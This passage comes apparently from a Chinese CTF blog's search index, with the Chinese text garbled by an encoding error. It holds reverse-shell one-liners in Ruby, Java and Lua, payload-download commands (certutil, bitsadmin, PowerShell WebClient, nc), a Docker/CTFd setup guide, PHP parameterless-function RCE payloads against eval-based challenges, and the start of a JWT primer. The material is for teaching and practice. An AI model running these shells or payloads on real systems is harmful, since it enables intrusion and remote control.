fork;c&#x3D;TCPSocket.new(&quot;x.x.x.x&quot;,&quot;5555&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39; æ–¹æ³•2ï¼š 1ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39; Java12345678910111213public class Revs &#123; &#x2F;** * @param args * @throws Exception *&#x2F; public static void main(String[] args) throws Exception &#123; &#x2F;&#x2F; TODO Auto-generated method stub Runtime r &#x3D; Runtime.getRuntime(); String cmd[]&#x3D; &#123;&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;; Process p &#x3D; r.exec(cmd); p.waitFor(); &#125;&#125; Lua1lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t&#x3D;socket.tcp();t:connect(&#39;x.x.x.x&#39;,&#39;5555&#39;);os.execute(&#39;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot; shellä¸‹è½½æ–‡ä»¶å…ˆæŠŠæ–‡ä»¶æ”¾åˆ°æœ‰å…¬ç½‘çš„æœåŠ¡å™¨ä¸Š windowsæ–¹æ³•1(powershell): 1powershell (new-object System.Net.WebClient).DownloadFile( &#39;http:&#x2F;&#x2F;****&#x2F;***&#39;,&#39;C:&#x2F;Users&#x2F;Public&#x2F;a.exe&#39;) æ–¹æ³•2(certutil)ï¼š 1certutil -urlcache -split -f http:&#x2F;&#x2F;***&#x2F;a.exe C:&#x2F;Users&#x2F;a.exe æ–¹æ³•3(bitsadmin): 1bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;download.fb.com&#x2F;file&#x2F;xx.zip c:\\pentest\\xx.zip Linuxæ–¹æ³•1(curl): 1curl -O http:&#x2F;&#x2F;****&#x2F;a.exe æ–¹æ³•2(nc): 12345678910111213&#x2F;&#x2F; åœ¨ 45.77.17.128 è¿™å°ä¸»æœºç›‘å¬ 9988 ç«¯å£ï¼ˆæ³¨æ„ç¬¦å·æ˜¯ &quot;&lt;&quot; ï¼‰# nc -l 9988 &lt; Python-3.6.6.tar.xz&#x2F;&#x2F; åœ¨ 192.168.1.254 è¿™å°ä¸»æœºä¸‹è½½æ–‡ä»¶ï¼ˆæ³¨æ„ç¬¦å·æ˜¯ &quot;&gt;&quot; ï¼‰# nc --recv-only 45.77.17.128 9988 &gt; Python-3.6.6.tar.xzæˆ–è€…&#x2F;&#x2F; åœ¨ 45.77.17.128 è¿™å°ä¸»æœºç›‘å¬ 9988 ç«¯å£ï¼ˆæ³¨æ„ç¬¦å·æ˜¯ &quot;&gt;&quot; ï¼‰# nc -l 9988 &gt; command.tar.gz&#x2F;&#x2F; åœ¨ 192.168.1.254 è¿™å°ä¸»æœºä¸Šä¼ æ–‡ä»¶ï¼ˆæ³¨æ„ç¬¦å·æ˜¯ &quot;&lt;&quot; ï¼‰# nc --send-only 45.77.17.128 9988 &lt; command.tar.gz æ–¹æ³•3(wegt): 1wegt http:&#x2F;&#x2F;****&#x2F;a.sh å‚è€ƒï¼š http://www.gtfly.top/2019/05/09/åå¼¹shell.html https://brucetg.github.io/2018/05/03/å¤šç§å§¿åŠ¿åå¼¹shell/","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.m00nback.xyz/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://www.m00nback.xyz/tags/ctf/"},{"name":"shell","slug":"shell","permalink":"http://www.m00nback.xyz/tags/shell/"}]},{"title":"ubuntu16.04 CTFdå¹³å°æ­å»º","slug":"ctfd-build","date":"2019-11-13T09:55:29.000Z","updated":"2020-04-03T14:45:26.553Z","comments":true,"path":"2019/11/13/ctfd-build/","link":"","permalink":"http://www.m00nback.xyz/2019/11/13/ctfd-build/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†å¦‚ä½•åœ¨ubuntu16.04ç”¨dockeræ­å»ºå¹³å°ï¼Œä»¥åŠéƒ¨ç½²é¢˜ç›®ç­‰ç­‰ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†å¦‚ä½•åœ¨ubuntu16.04ç”¨dockeræ­å»ºå¹³å°ï¼Œä»¥åŠéƒ¨ç½²é¢˜ç›®ç­‰ç­‰ï¼ å®‰è£…ç¯å¢ƒå®‰è£…å‰å…ˆè¯´ä¸€ä¸‹æˆ‘çš„ç¯å¢ƒï¼Œé˜¿é‡Œäº‘å­¦ç”Ÿæœº å®‰è£…git(æœ‰çš„è¯å¿½ç•¥ï¼‰ sudo apt-get update sudo apt-get install git å®‰è£…docker å¸è½½æ—§ç‰ˆæœ¬çš„docker sudo apt-get remove docker docker-engine docker.io containerd runc å®‰è£…ä»¥ä¸‹åŒ…ä»¥ä½¿aptå¯ä»¥é€šè¿‡HTTPSä½¿ç”¨å­˜å‚¨åº“ï¼ˆrepositoryï¼‰ sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common æ·»åŠ Dockerå®˜æ–¹çš„GPGå¯†é’¥ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æ¥è®¾ç½®stableå®˜æ–¹å­˜å‚¨åº“ sudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot; æˆ–è€…ä½¿ç”¨é˜¿é‡Œäº‘é•œåƒï¼Œä½¿ç”¨ä¸‹é¢ï¼ˆæ¨èä½¿ç”¨ï¼‰ 12345curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -sudo add-apt-repository \\&quot;deb [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/ubuntu \\$(lsb_release -cs) \\stable&quot; å†æ›´æ–°ä¸€ä¸‹aptåŒ…ç´¢å¼• sudo apt-get update å®‰è£…dockerce sudo apt-get install docker-ce docker-ce-cli containerd.io æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ docker version æŸ¥çœ‹dockeræœåŠ¡æ˜¯å¦å¯åŠ¨ systemctl status docker è‹¥æœªå¯åŠ¨ï¼Œåˆ™å¯åŠ¨dockeræœåŠ¡ sudo systemctl start docker è¯•ç€è¿è¡Œ sudo docker run hello-world å®‰è£…docker-compose sudo apt-get install docker-compose æ£€æŸ¥æ˜¯å¦å®‰è£…æˆåŠŸ docker-compose version å®‰è£…CTFd å…‹éš†åº“ git clone https://github.com/CTFd/CTFd.git cd CTFd/ å®‰è£…æ“ä½œç³»ç»Ÿéœ€è¦å®‰è£…çš„åŒ… ./prepare.sh å®‰è£…pythonéœ€è¦çš„åŒ… pip install -r requirements.txt è¿è¡ŒCTFd python serve.py å¯ä»¥æµ‹è¯•ä»¥ä¸‹æ˜¯å¦æˆåŠŸ curl 127.0.0.1:4000 å®Œæˆä»¥ä¸Šæ­¥éª¤åªæ˜¯åœ¨æœ¬åœ°æ­èµ·æœåŠ¡å™¨ï¼Œè¦æ˜¯æƒ³åœ¨å…¬ç½‘ï¼ˆç‰©ç†æœºï¼‰è®¿é—®ï¼Œè¿˜éœ€è¦å®‰è£…gunicorn gunicornéƒ¨ç½²CTFdå®‰è£… pip install gunicorn å¯åŠ¨æœåŠ¡ï¼Œåœ¨å…‹éš†çš„CTFdæ–‡ä»¶å¤¹ gunicorn --bind 0.0.0.0:4000 -w 5 &quot;CTFd:create_app()&quot; (gunicorn --bind 0.0.0.0:8000 -w 5 &quot;CTFd:create_app()&quot;&amp;) // è¿™é‡ŒåŠ äº†()è¿˜æœ‰&amp;æ˜¯ä¸ºäº†é‚£èƒ½å¤Ÿåå°è¿è¡Œ è¡¨ç¤ºç»‘å®šç«¯å£å·4000,æœ‰5ä¸ªè¿›ç¨‹æ¥å¤„ç†è¯·æ±‚ ä½¿ç”¨gunicornå¯åŠ¨æœåŠ¡ï¼Œè®¿é—®æœ¬æœºip+ç«¯å£å³å¯ï¼Œå…¬ç½‘è®¿é—®å“åº”å¾ˆæ…¢ æ³¨æ„ï¼š é˜¿é‡Œäº‘å®‰å…¨ç»„é»˜è®¤ä¸å¼€æ”¾4000ç«¯å£ï¼Œéœ€è¦åœ¨å®‰å…¨ç»„è®¾ç½® ç”¨å®å¡”çš„è¯ï¼Œå®‰å…¨-&gt;é˜²ç«å¢™é‡Œéœ€è¦æ”¾è¡Œç«¯å£ï¼ˆå‘äº†æˆ‘å¾ˆä¹…ï¼‰ é…ç½®mysql è¿™ä¸ªæˆ‘æ²¡è¯•è¿‡ï¼Œå¯ä»¥å‚è§è¿™ä¸ªhttps://blog.csdn.net/z1592570975/article/details/82912801 dockeréƒ¨ç½²CTFdè¿˜æœ‰ç§æ–¹å¼å°±æ˜¯æŠŠCTFdç›´æ¥æ”¾dockeré‡Œï¼Œæ— éœ€è‹¦æ¼ç¯å¢ƒé—®é¢˜,ç›´æ¥pullå®˜æ–¹æä¾›çš„ä¾èµ–ç¯å¢ƒ,æ­å»ºåçš„è®¿é—®é€Ÿåº¦æ˜æ˜¾æå‡ åœ¨CTFdæ–‡ä»¶å¤¹é‡Œ docker-compose up -d å¦‚æœå‡ºç°ä»¥ä¸‹é”™è¯¯ï¼Œå¯èƒ½æ˜¯docker-composeç‰ˆæœ¬é—®é¢˜ï¼Œå› ä¸ºä¹‹å‰ç”¨apt-getå®‰è£…çš„ï¼Œå¯èƒ½ç‰ˆæœ¬æœ‰ç‚¹è€ å‡ºç°è¿™ä¸ªé—®é¢˜å‘ç°ç”¨ pip uninstall texttable å¸è½½ä¸äº†ï¼Œé‚£å°± cd /usr/lib/python(ä½ çš„ç‰ˆæœ¬å·)/dist-packages/ rm -rf texttable-*.egg-info ç„¶åå†é‡æ–° pip install docker-compose å‘ç°å¯ä»¥å®‰è£…æˆåŠŸï¼Œç„¶å cd /CTFd docker-compose up -d è¿™ä¸ªè¿‡ç¨‹å¯èƒ½æœ‰ç‚¹æ¼«é•¿ï¼Œè€å¿ƒç­‰å¾…å°±å¥½ ä¼˜åŒ–é…ç½®CTFdæ±‰åŒ–æ±‰åŒ– ä¸‹è½½ä¸»é¢˜æ±‰åŒ–åŒ… å°†CTFd/CTFd/themesæ–‡ä»¶å¤¹æ›¿æ¢å³å¯ dockeré•œåƒæ¢æºdockeré»˜è®¤æºä¸ºå›½å¤–å®˜æ–¹çš„ï¼Œä¸‹è½½é€Ÿåº¦è¾ƒæ…¢ï¼›æ›´æ¢æºï¼š ä¿®æ”¹æˆ–æ–°å¢/etc/docker/daemon.jsonï¼š vi /etc/docker/daemon.json å†™å…¥ï¼š 12345&#123;&quot;registry-mirrors&quot;: [&quot;http:&#x2F;&#x2F;hub-mirror.c.163.com&quot;]&#125; å†é‡å¯å³å¯ dockeråŸºæœ¬ä½¿ç”¨dokeréƒ¨ç½²çš„ä¸œè¥¿åˆ†ä¸ºé•œåƒå’Œå®¹å™¨ä¸¤ç§ï¼Œæœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿ é•œåƒï¼š å¤šä¸ªåªè¯»å±‚å åŠ åœ¨ä¸€èµ·ï¼Œå±‚ä¸å±‚ä¹‹é—´é€šè¿‡æŒ‡é’ˆå…³è”ï¼Œè¿™äº›å±‚èƒ½å¤Ÿåœ¨è¿è¡ŒDockerçš„å®¿ä¸»æœºçš„æ–‡ä»¶ç³»ç»Ÿä¸Šè®¿é—®åˆ° å®¹å™¨ï¼š å®¹å™¨å’Œå®¹å™¨é•œåƒä¸€æ ·ï¼Œä¹Ÿæ˜¯è‹¥å¹²å±‚çš„å åŠ ï¼Œå”¯ä¸€åŒºåˆ«æ˜¯æ‰€æœ‰åªè¯»å±‚çš„æœ€ä¸Šé¢ä¸€å±‚ï¼Œæ˜¯ä¸€å±‚å¯è¯»å¯å†™å±‚ï¼Œåˆå­¦è€…å¯ä»¥è®°ä½è¿™ä¸ªç®€å•çš„å…¬å¼ï¼šå®¹å™¨ = å®¹å™¨é•œåƒ + å¯è¯»å¯å†™å±‚ dockeré•œåƒå¸¸è§å‘½ä»¤æŸ¥çœ‹æ‰€æœ‰ä¸‹è½½çš„é•œåƒï¼š sudo docker images æœç´¢é•œåƒï¼š sudo docker search é•œåƒåç§° è·å–é•œåƒï¼š sudo docker pull é•œåƒåç§° è¿è¡Œé•œåƒï¼š sudo docker run -d --name å®¹å™¨åç§° -p 80:80 é•œåƒåç§° -dï¼šåå°è¿è¡Œ -nameï¼šå®¹å™¨åç§°(è‡ªå·±å‘½å) -pï¼šæŒ‡å®šdockerè¿è¡Œæ­¤é•œåƒæ‰€ä½¿ç”¨çš„ç«¯å£ï¼Œç¬¬ä¸€ä¸ªæ˜¯å¤–ç½‘ç«¯å£ï¼Œç¬¬äºŒä¸ªæ˜¯å†…ç½‘ç«¯å£ â€“privilegedï¼šä½¿ç”¨è¯¥å‚æ•°ï¼Œcontainerå†…çš„rootæ‹¥æœ‰çœŸæ­£çš„rootæƒé™ -iï¼šä»¥äº¤äº’æ¨¡å¼è¿è¡Œå®¹å™¨ -tï¼šä¸ºå®¹å™¨é‡æ–°åˆ†é…ä¸€ä¸ªä¼ªè¾“å…¥ç»ˆç«¯ â€“link å…¶ä»–å®¹å™¨ï¼šå°†è¯¥å®¹å™¨ä¸å…¶ä»–å®¹å™¨è¿›è¡Œè¿æ¥ åˆ é™¤é•œåƒï¼š sudo docker rmi -f IMAGE-ID/name å…¶ä¸­ï¼ŒIMAGE-IDå¯åœ¨é•œåƒåˆ—è¡¨ä¸­æŸ¥çœ‹ï¼›åªéœ€ä½¿ç”¨IMAGE IDå‰å››ä½å³å¯ï¼›ä¹Ÿå¯ä»¥ä½¿ç”¨é•œåƒçš„åå­— dockerå®¹å™¨å¸¸è§å‘½ä»¤æŸ¥çœ‹å®¹å™¨åˆ—è¡¨ï¼š sudo docker ps -a åœæ­¢å®¹å™¨ï¼š sudo docker stop CONTAINER-ID/name å…¶ä¸­ï¼ŒCONTAINER IDå¯åœ¨å®¹å™¨åˆ—è¡¨ä¸­æŸ¥çœ‹ï¼›åªéœ€ä½¿ç”¨CONTAINER IDå‰å››ä½å³å¯ï¼›ä¹Ÿå¯ä»¥ä½¿ç”¨è¿è¡Œé•œåƒæ—¶æ‰€å‘½åçš„å®¹å™¨åå­— è¿è¡Œå®¹å™¨ï¼š sudo docker start CONTAINER-ID/name åˆ é™¤å®¹å™¨(å®¹å™¨éœ€å·²åœæ­¢è¿è¡Œ)ï¼š sudo docker rm CONTAINER-ID/name è¿›å…¥å®¹å™¨(ä¸çŸ¥é“ä»€ä¹ˆåŸå› ï¼Œä½¿ç”¨docker attachå‘½ä»¤æ— æ³•è¿›å…¥åˆ°å®¹å™¨ä¸­ï½) sudo docker exec -it CONTAINER-ID/name /bin/bash ä¸èƒ½ç”¨çš„è¯å¯ä»¥è¯•è¯• sudo docker exec -it CONTAINER-ID/name /bin/sh sudo docker exec -it CONTAINER-ID/name bash æ‹·è´æ–‡ä»¶ docker cp ~/index.php å®¹å™¨id:/var/www/html åŠ¨æ€é¶æœºæ­å»ºåŠ¨æ€flagæ­å»ºå¯ä»¥å‚è§è¿™å‡ ä½å¤§ä½¬çš„æ–‡ç«  https://www.zhaoj.in/read-6333.htmlhttp://www.gtfly.top/2019/09/27/CTFdåŠ¨æ€dockeré•œåƒç¼–å†™.html","categories":[],"tags":[{"name":"CTFd","slug":"CTFd","permalink":"http://www.m00nback.xyz/tags/CTFd/"},{"name":"docker","slug":"docker","permalink":"http://www.m00nback.xyz/tags/docker/"},{"name":"ç¯å¢ƒæ­å»º","slug":"ç¯å¢ƒæ­å»º","permalink":"http://www.m00nback.xyz/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}]},{"title":"phpæ— å‚æ•°å‡½æ•°åˆ©ç”¨","slug":"php-nopara-rce","date":"2019-11-12T12:21:35.000Z","updated":"2020-01-31T13:46:19.994Z","comments":true,"path":"2019/11/12/php-nopara-rce/","link":"","permalink":"http://www.m00nback.xyz/2019/11/12/php-nopara-rce/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†phpæ— å‚æ•°å‡½æ•°åˆ©ç”¨çš„ä¸€äº›æ–¹æ³•ï¼Œä»¥åŠå®ç°rceçš„ç¤ºä¾‹ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†phpæ— å‚æ•°å‡½æ•°åˆ©ç”¨çš„ä¸€äº›æ–¹æ³•ï¼Œä»¥åŠå®ç°rceçš„ç¤ºä¾‹ï¼ ä¸€é“æœ‰æ„æ€çš„é¢˜123456&lt;?phpif(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\\W]+\\((?R)?\\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123; eval($_GET[&#39;code&#39;]);&#125; else &#123; show_source(__FILE__);&#125; åˆ†æä¸€ä¸‹æ­£åˆ™éƒ¨åˆ†: \\WåŒ¹é…ä»»ä½•ä¸€ä¸ªå­—æ¯æˆ–è€…æ•°å­—æˆ–è€…ä¸‹åˆ’çº¿ä»¥å¤–çš„å­—ç¬¦ []ä»£è¡¨å­—ç¬¦é›† [^\\W]è¡¨ç¤ºåªèƒ½åŒ¹é…ä»»ä½•ä¸€ä¸ªå­—æ¯æˆ–è€…æ•°å­—æˆ–è€…ä¸‹åˆ’çº¿ï¼Œ^[abc]åˆ™è¡¨ç¤ºåŒ¹é…ä»¥aæˆ–bæˆ–cå¼€å¤´çš„ +è¡¨ç¤ºåŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ï¼Œ*è¡¨ç¤ºåŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡ï¼Œ?è¡¨ç¤ºåŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–ä¸€æ¬¡ åé¢çš„\\(å’Œ\\)è¡¨ç¤ºæ‹¬å·çš„è½¬ä¹‰ (?R)?è¡¨ç¤ºå¼•ç”¨å½“å‰è¡¨è¾¾å¼çš„æ„æ€ è¿™ä¸ªæ­£åˆ™è¡¨ç¤ºçš„æ„æ€å¤§æ¦‚å°±æ˜¯ï¼šåŒ¹é…æ— å‚æ•°çš„å‡½æ•°æˆ–è€…åµŒå¥—å‡½æ•°ï¼Œä¾‹å¦‚phpinfo() è¿™é“é¢˜åªè¦èƒ½æ„é€ ç±»ä¼¼æ— å‚å‡½æ•°ï¼Œå°±å¯ä»¥æ‰§è¡Œä¼ è¿‡å»çš„å†…å®¹ è§£é¢˜æ–¹æ³•getallheaders() ä¸€èˆ¬çš„payload: eval(end(getallheaders())) //è·å–httpè¯·æ±‚å¤´ä¸­æœ€åä¸€ä¸ªå‚æ•°çš„å€¼ï¼Œå¹¶æ‰§è¡Œ å…³äºendå‡½æ•°ï¼š åŒæ ·çš„æœ‰ç±»ä¼¼çš„å‡½æ•° åˆ©ç”¨çš„æ—¶å€™å¯ä»¥ç›´æ¥bpæŠ“åŒ…åœ¨httpå¤´æœ€åé¢åŠ ä¸Šè¦æ‰§è¡Œçš„ä»£ç  getenv() ä¸€èˆ¬çš„payload: eval(arrar_rand(array_flip(getenv()))) //è·å–æ‰€æœ‰ç¯å¢ƒå˜é‡ï¼Œè¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œåè½¬é”®å€¼ï¼Œéšæœºå…¶ä¸­ä¸€ä¸ªæ‰§è¡Œ array_flip()å‡½æ•°ï¼š array_rand()å‡½æ•°ï¼š ä¸€èˆ¬ä¸ä¸‹é¢çš„è¶…å…¨å±€å˜é‡ç»“åˆï¼Œå¯ä»¥ç”¨çˆ†ç ´çš„æ–¹å¼æ¥æ‰§è¡Œæ¶æ„å‚æ•° $GLOBALS $_SERVER $_GET $_POST $_FILES $_COOKIE $_SESSION $_REQUEST $_ENV //ç­‰ä»·äºgetenv()å‡½æ•° get_defined_vars() ä¸€èˆ¬çš„payloadï¼š eval(reset(current(get_defined_vars()))) current()å‡½æ•°ï¼š resetå‡½æ•°ï¼š ä¸€èˆ¬ä¸ä¸‹é¢çš„è¶…å…¨å±€å˜é‡ç»“åˆï¼Œå¯ä»¥ç”¨çˆ†ç ´çš„æ–¹å¼æ¥æ‰§è¡Œæ¶æ„å‚æ•° $GLOBALS $_SERVER $_GET $_POST $_FILES $_COOKIE $_SESSION $_REQUEST $_ENV //ç­‰ä»·äºgetenv()å‡½æ•° session_id() å› ä¸ºPHPSESSIDå¿…é¡»ä¸ºå¤§å°å†™å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿æ„æˆçš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç»•è¿‡ï¼Œå¯ä»¥å…ˆå¯¹æ‰§è¡Œçš„ä»£ç åå…­è¿›åˆ¶è½¬æ¢ï¼Œå†ç”¨hex2bin()å‡½æ•°è½¬æ¢è¿‡æ¥ï¼Œ706870696e666f28293bæ˜¯phpinfo();åå…­è¿›åˆ¶å½¢å¼ æˆåŠŸè¿”å›phpinfo ä¸€èˆ¬çš„payload: eval(hex2bin(session_id(session_start()))) hex2bin()å‡½æ•°ï¼š å¸¸ç”¨payload12è¯»æ–‡ä»¶ï¼šreadfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))) GXY(å®‰æ’æœˆèµ›)æºç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;;if(isset($_GET[&#x27;exp&#x27;]))&#123; if (!preg_match(&#x27;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123; if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123; if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123; // echo $_GET[&#x27;exp&#x27;]; @eval($_GET[&#x27;exp&#x27;]); &#125; else&#123; die(&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;); &#125; &#125; else&#123; die(&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;); &#125; &#125; else&#123; die(&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;); &#125;&#125;// highlight_file(__FILE__);?&gt; è¿™é¢˜å°±æ²¡æ³•ç”¨getallheaders()é‚£ç§æ–¹æ³•äº†ï¼Œç›´æ¥ä¸Špayload: ?exp=readfile(array_rand(array_flip(scandir(current(localeconv()))))); è§£é‡Šä¸€ä¸‹ï¼š 1234localeconv() &#x2F;&#x2F;è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„current() &#x2F;&#x2F;è¿”å›å½“å‰è¢«å†…éƒ¨æŒ‡é’ˆæŒ‡å‘çš„æ•°ç»„å•å…ƒçš„å€¼ï¼Œå¹¶ä¸ç§»åŠ¨æŒ‡é’ˆscandir() &#x2F;&#x2F;åˆ—å‡ºæŒ‡å®šè·¯å¾„ä¸­çš„æ–‡ä»¶å’Œç›®å½•readfile() &#x2F;&#x2F;è¯»å–æ–‡ä»¶å¹¶å†™å…¥åˆ°è¾“å‡ºç¼“å†²","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://www.m00nback.xyz/tags/ctf/"},{"name":"phpå‡½æ•°","slug":"phpå‡½æ•°","permalink":"http://www.m00nback.xyz/tags/php%E5%87%BD%E6%95%B0/"},{"name":"rce","slug":"rce","permalink":"http://www.m00nback.xyz/tags/rce/"}]},{"title":"JWTå­¦ä¹ ","slug":"json-web-token","date":"2019-11-06T12:51:11.000Z","updated":"2019-11-08T10:27:46.751Z","comments":true,"path":"2019/11/06/json-web-token/","link":"","permalink":"http://www.m00nback.xyz/2019/11/06/json-web-token/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦è®°å½•äº†JWTæœºåˆ¶çš„å­¦ä¹ è¿‡ç¨‹ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦è®°å½•äº†JWTæœºåˆ¶çš„å­¦ä¹ è¿‡ç¨‹ï¼ ä»€ä¹ˆæ˜¯JWT?JWTå…¨ç§°JSON WEB Tokenï¼Œæ˜¯ç”¨äºèº«ä»½è®¤è¯çš„ ä¸ºä»€ä¹ˆè¦æœ‰èº«ä»½è®¤è¯ï¼Ÿ ä¸»è¦æ˜¯å› ä¸ºHTTPæ˜¯æ— çŠ¶æ€çš„ï¼ŒåŒæ ·è®©HTTPæœ‰çŠ¶æ€çš„æ–¹å¼è¿˜æœ‰ï¼šsession,cookie Cookiecookie æ˜¯ä¸€ä¸ªéå¸¸å…·ä½“çš„ä¸œè¥¿ï¼ŒæŒ‡çš„å°±æ˜¯æµè§ˆå™¨é‡Œé¢èƒ½æ°¸ä¹…å­˜å‚¨çš„ä¸€ç§æ•°æ®ã€‚è·ŸæœåŠ¡å™¨æ²¡å•¥å…³ç³»ï¼Œä»…ä»…æ˜¯æµè§ˆå™¨å®ç°çš„ä¸€ç§æ•°æ®å­˜å‚¨åŠŸèƒ½ã€‚ cookieç”±æœåŠ¡å™¨ç”Ÿæˆï¼Œå‘é€ç»™æµè§ˆå™¨ï¼Œæµè§ˆå™¨æŠŠcookieä»¥KVå½¢å¼å­˜å‚¨åˆ°æŸä¸ªç›®å½•ä¸‹çš„æ–‡æœ¬æ–‡ä»¶ä¸­ï¼Œä¸‹ä¸€æ¬¡è¯·æ±‚åŒä¸€ç½‘ç«™æ—¶ä¼šæŠŠè¯¥cookieå‘é€ç»™æœåŠ¡å™¨ã€‚ç”±äºcookieæ˜¯å­˜åœ¨å®¢æˆ·ç«¯ä¸Šçš„ï¼Œæ‰€ä»¥æµè§ˆå™¨åŠ å…¥äº†ä¸€äº›é™åˆ¶ç¡®ä¿cookieä¸ä¼šè¢«æ¶æ„ä½¿ç”¨ï¼ŒåŒæ—¶ä¸ä¼šå æ®å¤ªå¤šç£ç›˜ç©ºé—´ã€‚æ‰€ä»¥æ¯ä¸ªåŸŸçš„cookieæ•°é‡æ˜¯æœ‰é™åˆ¶çš„ã€‚ Sessionsessionä»å­—é¢ä¸Šè®²ï¼Œå°±æ˜¯ä¼šè¯ã€‚è¿™ä¸ªå°±ç±»ä¼¼ä½ å’Œä¸€ä¸ªäººäº¤è°ˆï¼Œä½ æ€ä¹ˆçŸ¥é“å½“æ—¶å’Œä½ äº¤è°ˆçš„æ˜¯å¼ ä¸‰è€Œä¸æ˜¯æå››å‘¢ï¼Ÿå¯¹æ–¹è‚¯å®šæœ‰æŸç§ç‰¹å¾ï¼ˆé•¿ç›¸ç­‰ï¼‰è¡¨æ˜ä»–æ˜¯å¼ ä¸‰ï¼› sessionä¹Ÿæ˜¯ç±»ä¼¼çš„é“ç†ï¼ŒæœåŠ¡å™¨è¦çŸ¥é“å½“å‰è¯·æ±‚å‘ç»™è‡ªå·±çš„æ˜¯è°ã€‚ä¸ºäº†åšè¿™ç§åŒºåˆ†ï¼ŒæœåŠ¡å™¨å°±æ˜¯è¦ç»™æ¯ä¸ªå®¢æˆ·ç«¯åˆ†é…ä¸åŒçš„â€èº«ä»½æ ‡è¯†â€ï¼Œç„¶åå®¢æˆ·ç«¯æ¯æ¬¡å‘æœåŠ¡å™¨å‘è¯·æ±‚çš„æ—¶å€™ï¼Œéƒ½å¸¦ä¸Šè¿™ä¸ªâ€èº«ä»½æ ‡è¯†â€œï¼ŒæœåŠ¡å™¨å°±çŸ¥é“è¿™ä¸ªè¯·æ±‚æ¥è‡ªä¸è°äº†ã€‚è‡³äºå®¢æˆ·ç«¯æ€ä¹ˆä¿å­˜è¿™ä¸ªâ€èº«ä»½æ ‡è¯†â€œï¼Œå¯ä»¥æœ‰å¾ˆå¤šæ–¹å¼ï¼Œå¯¹äºæµè§ˆå™¨å®¢æˆ·ç«¯ï¼Œå¤§å®¶éƒ½é‡‡ç”¨cookieçš„æ–¹å¼ã€‚ Json Web Tokenç»“æ„JSON Web Tokensç”±dotï¼ˆ.ï¼‰åˆ†éš”çš„ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼Œå®ƒä»¬æ˜¯ï¼š Headerï¼ˆå¤´éƒ¨ï¼‰ Payloadï¼ˆè´Ÿè½½ï¼‰ Signatureï¼ˆç­¾åï¼‰ å› æ­¤ï¼ŒJWTé€šå¸¸å¦‚ä¸‹å±•ç¤ºï¼š xxxxx.yyyyy.zzzz ç»„æˆ: uid: ç”¨æˆ·å”¯ä¸€èº«ä»½æ ‡è¯† time: å½“å‰æ—¶é—´çš„æ—¶é—´æˆ³ sign: ç­¾å, ä½¿ç”¨ hash/encrypt å‹ç¼©æˆå®šé•¿çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œä»¥é˜²æ­¢ç¬¬ä¸‰æ–¹æ¶æ„æ‹¼æ¥ å›ºå®šå‚æ•°(å¯é€‰): å°†ä¸€äº›å¸¸ç”¨çš„å›ºå®šå‚æ•°åŠ 